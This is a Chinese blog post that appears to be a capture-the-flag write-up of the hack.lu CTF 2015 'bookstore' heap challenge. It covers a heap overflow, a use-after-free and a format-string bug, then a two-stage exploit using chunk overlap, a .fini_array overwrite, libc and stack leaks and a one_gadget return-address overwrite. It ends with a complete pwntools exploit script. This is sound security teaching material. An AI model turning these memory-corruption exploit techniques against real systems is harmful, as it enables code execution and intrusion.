<!DOCTYPE html>


  <html class="light page-post">


<head>
  <meta charset="utf-8">
  
  <title>hack.lu ctf 2015 bookstore | V1NKe的心情垃圾桶</title>

  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">

  
    <meta name="keywords" content="PWN," />
  

  <meta name="description" content="PWN,CTF">
<meta name="keywords" content="PWN">
<meta property="og:type" content="article">
<meta property="og:title" content="hack.lu ctf 2015 bookstore">
<meta property="og:url" content="http://yoursite.com/2018/09/11/hack.lu ctf 2015 bookstore/index.html">
<meta property="og:site_name" content="V1NKe的心情垃圾桶">
<meta property="og:description" content="PWN,CTF">
<meta property="og:locale" content="default">
<meta property="og:image" content="http://yoursite.com/hack.lu%20ctf%202015%20bookstore/屏幕快照%202018-09-11%20下午6.23.40.png">
<meta property="og:image" content="http://yoursite.com/hack.lu%20ctf%202015%20bookstore/屏幕快照%202018-09-11%20下午7.29.52.png">
<meta property="og:image" content="http://yoursite.com/hack.lu%20ctf%202015%20bookstore/屏幕快照%202018-09-11%20下午8.20.56.png">
<meta property="og:image" content="http://yoursite.com/hack.lu%20ctf%202015%20bookstore/屏幕快照%202018-09-11%20下午8.21.19.png">
<meta property="og:image" content="http://yoursite.com/hack.lu%20ctf%202015%20bookstore/屏幕快照%202018-09-11%20下午9.16.26.png">
<meta property="og:updated_time" content="2018-09-11T13:49:27.855Z">
<meta name="twitter:card" content="summary">
<meta name="twitter:title" content="hack.lu ctf 2015 bookstore">
<meta name="twitter:description" content="PWN,CTF">
<meta name="twitter:image" content="http://yoursite.com/hack.lu%20ctf%202015%20bookstore/屏幕快照%202018-09-11%20下午6.23.40.png">

  

  
    <link rel="icon" href="/haimian.ico">
  

  <link href="/css/styles.css?v=c114cbe6" rel="stylesheet">


  
    <link rel="stylesheet" href="/css/personal-style.css">
  

  

  
  <script type="text/javascript">
    var _hmt = _hmt || [];
    (function() {
      var hm = document.createElement("script");
      hm.src = "//hm.baidu.com/hm.js?57e94d016e201fba3603a8a2b0263af0";
      var s = document.getElementsByTagName("script")[0];
      s.parentNode.insertBefore(hm, s);
    })();
  </script>


  
  <script type="text/javascript">
	(function(){
	    var bp = document.createElement('script');
	    var curProtocol = window.location.protocol.split(':')[0];
	    if (curProtocol === 'https') {
	        bp.src = 'https://zz.bdstatic.com/linksubmit/push.js';        
	    }
	    else {
	        bp.src = 'http://push.zhanzhang.baidu.com/push.js';
	    }
	    var s = document.getElementsByTagName("script")[0];
	    s.parentNode.insertBefore(bp, s);
	})();
  </script>



  
    <script async src="https://dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js"></script>
  

  
    <link rel="stylesheet" href="//cdn.bootcss.com/font-awesome/4.3.0/css/font-awesome.min.css">
  
</head>

<body>


  
    <span id="toolbox-mobile" class="toolbox-mobile">盒子</span>
  

  <div class="post-header CENTER">
   
  <div class="toolbox">
    <a class="toolbox-entry" href="/">
      <span class="toolbox-entry-text">盒子</span>
      <i class="icon-angle-down"></i>
      <i class="icon-home"></i>
    </a>
    <ul class="list-toolbox">
      
        <li class="item-toolbox">
          <a
            class="CIRCLE"
            href="/archives/"
            rel="noopener noreferrer"
            target="_self"
            >
            博客
          </a>
        </li>
      
        <li class="item-toolbox">
          <a
            class="CIRCLE"
            href="/tag/"
            rel="noopener noreferrer"
            target="_self"
            >
            标签
          </a>
        </li>
      
        <li class="item-toolbox">
          <a
            class="CIRCLE"
            href="/link/"
            rel="noopener noreferrer"
            target="_self"
            >
            友链
          </a>
        </li>
      
        <li class="item-toolbox">
          <a
            class="CIRCLE"
            href="/about/"
            rel="noopener noreferrer"
            target="_self"
            >
            关于
          </a>
        </li>
      
    </ul>
  </div>


</div>


  <div id="toc" class="toc-article">
    <strong class="toc-title">文章目录</strong>
    <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#前言-："><span class="toc-text">前言 ：</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#概述-："><span class="toc-text">概述 ：</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#详解-："><span class="toc-text">详解 ：</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#功能-："><span class="toc-text">功能 ：</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#漏洞-："><span class="toc-text">漏洞 ：</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#利用-："><span class="toc-text">利用 ：</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#先来第一阶段的利用-："><span class="toc-text">先来第一阶段的利用 ：</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#第二阶段的利用-："><span class="toc-text">第二阶段的利用 ：</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#结果-："><span class="toc-text">结果 ：</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#EXP-："><span class="toc-text">EXP ：</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#相关链接："><span class="toc-text">相关链接：</span></a></li></ol></li></ol>
  </div>



<div class="content content-post CENTER">
   <article id="post-hack.lu ctf 2015 bookstore" class="article article-type-post" itemprop="blogPost">
  <header class="article-header">
    <h1 class="post-title">hack.lu ctf 2015 bookstore</h1>

    <div class="article-meta">
      <span>
        <i class="icon-calendar"></i>
        <span>2018.09.11</span>
      </span>

      
        <span class="article-author">
          <i class="icon-user"></i>
          <span>V1NKe</span>
        </span>
      

      


      

      
      <i class="fa fa-eye"></i> 
        <span id="busuanzi_container_page_pv">
           &nbsp热度 <span id="busuanzi_value_page_pv">
           <i class="fa fa-spinner fa-spin"></i></span>℃
        </span>
      
      
    </div>
  </header>

  <div class="article-content">
    
      <h2 id="前言-："><a href="#前言-：" class="headerlink" title="前言 ："></a>前言 ：</h2><p>我是真的懒。。自从六月颓了之后再过一个暑假整个人基本上算是废物状态。。还好最近进度慢慢起步上来了，不然得完蛋了，这道题花了我两天才解出来，感觉自己是真的菜，但是解出来的瞬间真的是巨他妈快乐，而且现在还没有人写过完整且正常的writeup，所以我觉得我是第一人，就巨他妈的开心。</p>
<h2 id="概述-："><a href="#概述-：" class="headerlink" title="概述 ："></a>概述 ：</h2><p>15年的一道题，尝试解题无果之后去搜了搜writeup，结果并没有搜到。。只有一篇非正常getshell的文章。。作者打比赛时候靠着本机环境和比赛机一致，靠着设定好system地址getshell。看的我一脸懵，还是靠自己解吧。。肝了一天多终于肝出来了。。本菜🐔还是菜啊。。</p>
<p>这道题虽然看似漏洞很多，但是要利用起来还真是有点困难。</p>
<h2 id="详解-："><a href="#详解-：" class="headerlink" title="详解 ："></a>详解 ：</h2><p>checksec：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">➜  books checksec ./books </span><br><span class="line">[*] &apos;/home/parallels/Desktop/PWN/PwnWiKi/heap/books/books&apos;</span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    No RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x400000)</span><br></pre></td></tr></table></figure>
<h3 id="功能-："><a href="#功能-：" class="headerlink" title="功能 ："></a>功能 ：</h3><p>该程序是个书店，订书的功能，最多订购两本书，订购每本书的时候可以填写订单内容，这里面可以无限制任意写，然后是删除订单，删除订单中只<code>free</code>掉了指针，没有把指针置为NULL，存在UAF漏洞，且指针的位置处于栈地址上，最后是一个提交功能，提交功能是将两本书的内容合在一起打印出来，但是提交后存在一个格式化字符串的漏洞。</p>
<h3 id="漏洞-："><a href="#漏洞-：" class="headerlink" title="漏洞 ："></a>漏洞 ：</h3><ol>
<li>任意写，堆溢出漏洞：</li>
</ol>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">unsigned __int64 __fastcall sub_400876(__int64 a1)</span><br><span class="line">&#123;</span><br><span class="line">  int v1; // eax</span><br><span class="line">  int v3; // [rsp+10h] [rbp-10h]</span><br><span class="line">  int v4; // [rsp+14h] [rbp-Ch]</span><br><span class="line">  unsigned __int64 v5; // [rsp+18h] [rbp-8h]</span><br><span class="line"></span><br><span class="line">  v5 = __readfsqword(0x28u);</span><br><span class="line">  v3 = 0;</span><br><span class="line">  v4 = 0;</span><br><span class="line">  while ( v3 != &apos;\n&apos; )      &lt;----------------换行符才结束循环，任意写</span><br><span class="line">  &#123;</span><br><span class="line">    v3 = fgetc(stdin);</span><br><span class="line">    v1 = v4++;</span><br><span class="line">    *(_BYTE *)(v1 + a1) = v3;</span><br><span class="line">  &#125;</span><br><span class="line">  *(_BYTE *)(v4 - 1LL + a1) = 0;</span><br><span class="line">  return __readfsqword(0x28u) ^ v5;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ol start="2">
<li>UAF漏洞：</li>
</ol>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">unsigned __int64 __fastcall sub_4008FA(void *a1)</span><br><span class="line">&#123;</span><br><span class="line">  unsigned __int64 v1; // ST18_8</span><br><span class="line"></span><br><span class="line">  v1 = __readfsqword(0x28u);</span><br><span class="line">  free(a1);                &lt;-----------------没有将指针置为NULL</span><br><span class="line">  return __readfsqword(0x28u) ^ v1;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ol start="3">
<li>格式化字符串漏洞</li>
</ol>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">printf(&quot;%s&quot;, v5);</span><br><span class="line">printf(dest);            &lt;-----------------格式化字符串</span><br><span class="line">return 0LL;</span><br></pre></td></tr></table></figure>
<h3 id="利用-："><a href="#利用-：" class="headerlink" title="利用 ："></a>利用 ：</h3><p>那么问题来了，漏洞看起来这么的多，怎么去利用？首先我们得注意三点：</p>
<ol>
<li>使用submit功能的时候程序就结束了，也就是一次性，但是<code>printf</code>格式化恰好就在程序结束处才产生。</li>
<li>格式化的字符串从系统<code>malloc</code>的第三块堆内容中获取。</li>
<li>无法自行分配堆，只能从程序本身申请的三块堆和submit功能中申请的堆中去利用。</li>
</ol>
<p>但是我们会遇到一些问题，比如说我们想用溢出控制第三块堆中的内容再利用格式化字符串的时候会遇到填写订单内容后被<code>strcpy</code>函数给重新覆盖掉第三堆块的内容。</p>
<p>这里我们应当使用到Overlapping，先<code>delete</code>第二堆块，再用堆块一溢出堆块二的<code>size</code>字段为<code>0x151</code>，这样当利用<code>submit</code>功能的时候所申请的<code>0x140</code>堆块就能出现在堆块二的位置上，随后便能利用<code>submit</code>合并两个堆块内容的作用覆盖到第三堆块，如果构造好覆盖内容，我们便能在程序最后利用到格式化字符串的内容。</p>
<p>显然，一次利用并不能达到我们getshell的目的，这里<strong>用到这么一个知识点 :</strong></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">程序退出后会执行`.fini_array`地址处的函数，不过只能利用一次。</span><br></pre></td></tr></table></figure>
<p>所以我们可以利用第一次格式化字符串将<code>.fini_array</code>地址处的函数修改成<code>main</code>函数的地址，使程序重新回到<code>main</code>函数。当然，我们还需要泄漏<code>libc</code>地址。</p>
<h4 id="先来第一阶段的利用-："><a href="#先来第一阶段的利用-：" class="headerlink" title="先来第一阶段的利用 ："></a>先来第一阶段的利用 ：</h4><p><code>delete</code>掉堆块二：</p>
<p><img src="/hack.lu ctf 2015 bookstore/屏幕快照 2018-09-11 下午6.23.40.png" alt="屏幕快照 2018-09-11 下午6.23.40"></p>
<p>利用堆块一覆盖重写的这里我们需要注意，我们所构造的<code>payload</code>需要和后面利用的格式化字符串所匹配。</p>
<p>堆块位置如下：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">0x602000:	0x0000000000000000	0x0000000000000091 &lt;--堆块一头</span><br><span class="line">0x602010:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x602020:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x602030:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x602040:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x602050:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x602060:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x602070:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x602080:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x602090:	0x0000000000000000	0x0000000000000091 &lt;--新申请的0x140堆块头</span><br><span class="line">0x6020a0:	0x00007ffff7dd1b78	0x00007ffff7dd1b78 </span><br><span class="line">0x6020b0:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x6020c0:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x6020d0:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x6020e0:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x6020f0:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x602100:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x602110:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x602120:	0x0000000000000090	0x0000000000000090 &lt;--dest堆块头(printf处)</span><br><span class="line">0x602130:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x602140:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x602150:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x602160:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x602170:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x602180:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x602190:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x6021a0:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x6021b0:	0x0000000000000000	0x0000000000000411</span><br></pre></td></tr></table></figure>
<p>我们需要让<code>printf</code>堆块处执行格式化的漏洞，就需要让<code>submit</code>功能去帮助我们覆盖，<code>submit</code>功能会加上<code>order1:</code>等这些字符串，不能漏掉，总结后可以得知新申请的堆块内容为：</p>
<blockquote>
<p><code>Order 1:</code> + <code>chunk1</code> + <code>\n</code> + <code>Order 2:</code> + <code>chunk2</code> + <code>\n</code></p>
</blockquote>
<p>因为<code>chunk2</code>已经被<code>delete</code>掉了，所以当复制<code>chunk2</code>中的内容的时候复制的其实是<code>order 1: + chunk1</code>。所以上述可以变为：</p>
<blockquote>
<p><code>Order 1:</code> + <code>chunk1</code> + <code>\n</code> + <code>Order 2:</code> + <code>Order 1:</code> + <code>chunk1</code> + <code>\n</code></p>
</blockquote>
<p>所以我们可以构造第二次的<code>chunk1</code>内容恰好覆盖到<code>dest</code>堆块处。也就是：</p>
<blockquote>
<p>size(<code>Order 1:</code> + <code>chunk1</code> + <code>\n</code> + <code>Order 2:</code> + <code>Order 1:</code>)  == <code>0x90</code></p>
</blockquote>
<blockquote>
<p>size(<code>chunk1</code>) == <code>0x90 - 28</code> == <code>0x74</code></p>
</blockquote>
<p>所以我们构造<code>chunk1</code>中的内容的时候只要使其中非<code>0</code>字符串的个数达到<code>0x74</code>就行了。</p>
<p>因为输入选项的时候可输入<code>128</code>个数字符串：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">fgets(&amp;s, 128, stdin);</span><br></pre></td></tr></table></figure>
<p>所以我们可以提前在栈中构造好我们所需要用格式化字符串修改的任意地址。</p>
<p>输入点在格式化偏移为12处，我们第一轮利用需要修改的是<code>.fini_array</code>处的内容，所以我们在栈中可以这么构造：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload2 = &apos;5&apos;+p8(0x0)*7 + p64(fini_array)  &lt;-- 5为选用submit功能</span><br></pre></td></tr></table></figure>
<p>而<code>chunk1</code>中的内容可以这么构造：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">payload = &quot;%&quot;+str(2617)+&quot;c%13$hn&quot;  + &apos;.%31$p&apos; + &apos;,%28$p&apos;</span><br><span class="line">payload += &apos;A&apos;*(0x74-len(payload))</span><br><span class="line">payload += p8(0x0)*(0x88-len(payload))</span><br><span class="line">payload += p64(0x151)</span><br></pre></td></tr></table></figure>
<p>这里的<code>&#39;.%31$p&#39;</code>目的是泄漏<code>__libc_start_main</code>函数的地址，从而<code>leak libc</code>的地址。而这里的<code>&#39;,%28$p&#39;</code>目的我后面会说到。</p>
<h4 id="第二阶段的利用-："><a href="#第二阶段的利用-：" class="headerlink" title="第二阶段的利用 ："></a>第二阶段的利用 ：</h4><p>这里我们能怎么接下去利用呢？<code>ctf-wiki</code>上的解法是拿到<code>system</code>函数的地址后去覆盖<code>free_got</code>。我试了这解法后才知道这解法还需要再来一轮去触发<code>free</code>函数。。所以这个思路行不通。。<code>wiki</code>上贴的<code>exp</code>好像只执行了第一阶段，第二阶段的利用没有。。</p>
<p>搜索到的唯一一个<code>exp</code>是通过设定<code>system</code>地址佛系<code>getshell</code>的。。所以还是得自己来着手。。我想这题目肯定是有一个常规解的。所以我自己来肝。。</p>
<p><strong>我的思路是通过第二阶段修改主函数返回地址getshell：</strong></p>
<p>返回地址在栈上的位置是随机的，所以我们需要找一个与返回地址有固定偏移的栈地址。我们从栈上去找一找，我发现了这么一个地址：</p>
<p><img src="/hack.lu ctf 2015 bookstore/屏幕快照 2018-09-11 下午7.29.52.png" alt="屏幕快照 2018-09-11 下午7.29.52"></p>
<p>这个栈地址始终指向比自己低<code>0x10</code>字节的栈地址，而且指向的栈地址和返回地址也有固定的<code>0x28</code>的偏移，所以我选择用格式化字符串泄漏这个栈地址，但是这里还有一个问题：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">第一阶段利用后重新执行main函数后，栈上的地址会产生一个固定的偏移。</span><br></pre></td></tr></table></figure>
<p>上面所提到的<code>payload</code>中<code>&#39;,%28$p&#39;</code>的目的就是泄漏这个栈地址。</p>
<p>我们直接把<code>gdb attach</code>上去计算固定的偏移：</p>
<p><img src="/hack.lu ctf 2015 bookstore/屏幕快照 2018-09-11 下午8.20.56.png" alt="屏幕快照 2018-09-11 下午8.20.56"></p>
<p>泄漏得到的第一阶段的返回地址：<code>0x7ffd88f7d6f8</code></p>
<p><img src="/hack.lu ctf 2015 bookstore/屏幕快照 2018-09-11 下午8.21.19.png" alt="屏幕快照 2018-09-11 下午8.21.19"></p>
<p><code>gdb</code>中得到的第二阶段的返回地址：<code>0x7ffd88f7d4e8</code></p>
<p>所以固定偏移为：<code>0x7ffd88f7d6f8 - 0x7ffd88f7d4e8 = 0x210</code></p>
<p>我们得到了第二阶段的返回地址的栈地址之后就好办事了，重复第一阶段的构造利用即可，这里面为了方便，可以直接利用<code>one_gadget</code>工具中的<code>execve</code>函数地址来覆盖返回地址。这里经过观察可以发现，<code>execve</code>的地址和返回地址只有最后三个字节不同，所以构造格式化漏洞的时候只需要覆盖返回地址最后的三位即可。</p>
<p>可能机子环境不一样这个固定偏移也不一样，我的环境是：</p>
<blockquote>
<p>Ubuntu16.04，glibc2.23</p>
</blockquote>
<h3 id="结果-："><a href="#结果-：" class="headerlink" title="结果 ："></a>结果 ：</h3><p><img src="/hack.lu ctf 2015 bookstore/屏幕快照 2018-09-11 下午9.16.26.png" alt="屏幕快照 2018-09-11 下午9.16.26"></p>
<h2 id="EXP-："><a href="#EXP-：" class="headerlink" title="EXP ："></a>EXP ：</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">p = process(&apos;./books&apos;)</span><br><span class="line">context.log_level = &apos;debug&apos;</span><br><span class="line">elf = ELF(&apos;./books&apos;)</span><br><span class="line">libc = ELF(&apos;libc.so&apos;)</span><br><span class="line"></span><br><span class="line">def edit1(content) :</span><br><span class="line">    sleep(0.1)</span><br><span class="line">    p.sendline(&apos;1&apos;)</span><br><span class="line">    p.recvuntil(&apos;Enter first order:\n&apos;)</span><br><span class="line">    p.sendline(content)</span><br><span class="line"></span><br><span class="line">def edit2(content) :</span><br><span class="line">    sleep(0.1)</span><br><span class="line">    p.sendline(&apos;2&apos;)</span><br><span class="line">    p.recvuntil(&apos;Enter second order:\n&apos;)</span><br><span class="line">    p.sendline(content)</span><br><span class="line"></span><br><span class="line">def delete1() :</span><br><span class="line">    sleep(0.1)</span><br><span class="line">    p.sendline(&apos;3&apos;)</span><br><span class="line"></span><br><span class="line">def delete2() :</span><br><span class="line">    sleep(0.1)</span><br><span class="line">    p.sendline(&apos;4&apos;)</span><br><span class="line"></span><br><span class="line">def submit() :</span><br><span class="line">    sleep(0.1)</span><br><span class="line">    p.sendline(&apos;5&apos;)</span><br><span class="line"></span><br><span class="line">free_got = elf.got[&apos;free&apos;]</span><br><span class="line">fini_array = 0x6011B8</span><br><span class="line">main_addr = 0x400A39</span><br><span class="line"></span><br><span class="line">delete2()</span><br><span class="line"></span><br><span class="line">payload = &quot;%&quot;+str(2617)+&quot;c%13$hn&quot;  + &apos;.%31$p&apos; + &apos;,%28$p&apos;</span><br><span class="line">payload += &apos;A&apos;*(0x74-len(payload))</span><br><span class="line">payload += p8(0x0)*(0x88-len(payload))</span><br><span class="line">payload += p64(0x151)</span><br><span class="line">edit1(payload)</span><br><span class="line"></span><br><span class="line">payload2 = &apos;5&apos;+p8(0x0)*7 + p64(fini_array)</span><br><span class="line">p.sendline(payload2)</span><br><span class="line"></span><br><span class="line">#leak --&gt; libc_base</span><br><span class="line">p.recvuntil(&apos;\x2e&apos;)</span><br><span class="line">p.recvuntil(&apos;\x2e&apos;)</span><br><span class="line">p.recvuntil(&apos;\x2e&apos;)</span><br><span class="line">data = p.recv(14)</span><br><span class="line">p.recvuntil(&apos;,&apos;)</span><br><span class="line">ret_addr = p.recv(14)</span><br><span class="line">data = int(data,16) - 240</span><br><span class="line">ret_addr = int(ret_addr,16) + 0x28 - 0x210</span><br><span class="line">libc_base = data - libc.symbols[&apos;__libc_start_main&apos;]</span><br><span class="line">log.success(&apos;ret_addr :&apos;+hex(ret_addr))</span><br><span class="line"></span><br><span class="line">#repeat --&gt; change ret_addr --&gt; system_addr(one_gadget)</span><br><span class="line">one_shot = libc_base + 0x45216</span><br><span class="line">print hex(one_shot)</span><br><span class="line">one_shot1 = &apos;0x&apos;+str(hex(one_shot))[-2:]</span><br><span class="line">one_shot2 = &apos;0x&apos;+str(hex(one_shot))[-6:-2]</span><br><span class="line">print one_shot1,one_shot2</span><br><span class="line">one_shot1 = int(one_shot1,16)</span><br><span class="line">one_shot2 = int(one_shot2,16)</span><br><span class="line"></span><br><span class="line">delete2()</span><br><span class="line"></span><br><span class="line">payload3 = &quot;%&quot; + str(one_shot1) + &quot;d%13$hhn&quot;</span><br><span class="line">payload3 += &apos;%&apos; + str(one_shot2-one_shot1) + &apos;d%14$hn&apos;</span><br><span class="line">payload3 += &apos;A&apos;*(0x74-len(payload3))</span><br><span class="line">payload3 += p8(0x0)*(0x88-len(payload3))</span><br><span class="line">payload3 += p64(0x151)</span><br><span class="line">edit1(payload3)</span><br><span class="line"></span><br><span class="line">payload4 = &apos;5&apos; + p8(0x0)*7 + p64(ret_addr) + p64(ret_addr+1)</span><br><span class="line">p.sendline(payload4)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
<h3 id="相关链接："><a href="#相关链接：" class="headerlink" title="相关链接："></a>相关链接：</h3><p><a href="http://tukan.farm/2016/02/25/hacklu-2015-bookstore-writeup/" target="_blank" rel="noopener">Hack.lu 2015 bookstore writeup</a></p>

    
  </div>

  
      <div class="git"></div>
  

</article>


   

   
  <div class="box-prev-next clearfix">
    <a class="show pull-left" href="/2018/06/26/Return_to_dl_resolve/">
        <i class="icon icon-angle-left"></i>
    </a>
    <a class="show pull-right" href="/2018/09/13/House Of Einherjar/">
        <i class="icon icon-angle-right"></i>
    </a>
  </div>




</div>


  <a id="backTop" class="back-top">
    <i class="icon-angle-up"></i>
  </a>




  <div class="modal" id="modal">
  <span id="cover" class="cover hide"></span>
  <div id="modal-dialog" class="modal-dialog hide-dialog">
    <div class="modal-header">
      <span id="close" class="btn-close">关闭</span>
    </div>
    <hr>
    <div class="modal-body">
      <ul class="list-toolbox">
        
          <li class="item-toolbox">
            <a
              class="CIRCLE"
              href="/archives/"
              rel="noopener noreferrer"
              target="_self"
              >
              博客
            </a>
          </li>
        
          <li class="item-toolbox">
            <a
              class="CIRCLE"
              href="/tag/"
              rel="noopener noreferrer"
              target="_self"
              >
              标签
            </a>
          </li>
        
          <li class="item-toolbox">
            <a
              class="CIRCLE"
              href="/link/"
              rel="noopener noreferrer"
              target="_self"
              >
              友链
            </a>
          </li>
        
          <li class="item-toolbox">
            <a
              class="CIRCLE"
              href="/about/"
              rel="noopener noreferrer"
              target="_self"
              >
              关于
            </a>
          </li>
        
      </ul>

    </div>
  </div>
</div>



  
      <div class="fexo-comments comments-post">
    

    
    

    
    

    

    
    

  </div>

  

  <script type="text/javascript">
  function loadScript(url, callback) {
    var script = document.createElement('script')
    script.type = 'text/javascript';

    if (script.readyState) { //IE
      script.onreadystatechange = function() {
        if (script.readyState == 'loaded' ||
          script.readyState == 'complete') {
          script.onreadystatechange = null;
          callback();
        }
      };
    } else { //Others
      script.onload = function() {
        callback();
      };
    }

    script.src = url;
    document.getElementsByTagName('head')[0].appendChild(script);
  }

  window.onload = function() {
    loadScript('/js/bundle.js?235683', function() {
      // load success
    });
  }
</script>

</body>
</html>
